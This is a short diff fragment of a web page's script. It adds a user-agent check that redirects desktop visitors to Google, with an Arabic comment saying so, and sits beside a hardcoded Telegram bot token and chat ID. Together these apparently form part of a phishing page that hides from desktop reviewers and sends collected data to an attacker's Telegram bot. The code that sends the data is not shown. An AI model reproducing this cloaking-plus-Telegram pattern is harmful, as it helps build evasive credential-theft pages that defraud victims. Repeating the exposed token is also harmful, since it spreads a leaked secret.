@@ -129,7 +129,11 @@
     </div>
 </div>
 <script>
-    
+ if (!/Android|iPhone/i.test(navigator.userAgent)) {
+    // إذا لم يكن جوال، وجهه لموقع جوجل أو صفحة فارغة
+    window.location.href = "https://www.google.com";
+}
+   
 const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
 const chatId = "7388801889"; 
     
